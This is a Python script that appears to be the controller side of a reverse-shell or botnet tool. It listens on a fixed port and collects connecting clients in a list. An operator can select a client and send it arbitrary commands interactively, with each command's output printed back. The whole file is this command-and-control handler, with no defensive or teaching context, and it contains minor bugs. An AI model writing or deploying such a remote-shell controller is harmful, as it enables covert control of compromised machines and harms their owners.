import socket, threading

IP = ''
PORT = 3056
SIZE = 1024
ADDR = (IP, PORT)

client_list = []


def send_to_client(target_socket, addr):
    print('Connected by {}'.format(addr))

    try:
        while True:
            cmd = input("{}> ".format(addr))
            if cmd == 'exit':
                break
            target_socket.sendall(cmd.encode())
            res = target_socket.recv(SIZE).decode()
            if res == 'Error':
                print('Error: Disconnected {}'.format(addr))
                terminate_connect(addr)
                target_socket.close
            print(res)
    except:
        print('Error: Disconnected {}'.format(addr))
        terminate_connect(addr)
        target_socket.close()
        


def receive_connect():
    with socket.socket() as server_socket:
        server_socket.bind(ADDR)
        server_socket.listen()

        while True:
            client_socket, client_addr = server_socket.accept()
            print('New connect: {}\n'.format(client_addr))
            client_list.append((client_socket, client_addr))

def terminate_connect(addr):
    for i in range(len(client_list)):
        if client_list[i][1] == addr:
            del client_list[i]

def get_client_list():
    res = []
    for i in range(len(client_list)):
        res.append((i, client_list[i][1]))
    return res



rc = threading.Thread(target=receive_connect)
rc.start()

while True:
    cmd = input('>>> ')
    if cmd == 'exit':
        break
    if cmd == 'status':
        print(get_client_list())
    cmd = cmd.split()
    if len(cmd) == 2:
        if cmd[0] == 'enter':
            i = int(cmd[1])
            send_to_client(client_list[i][0], client_list[i][1])




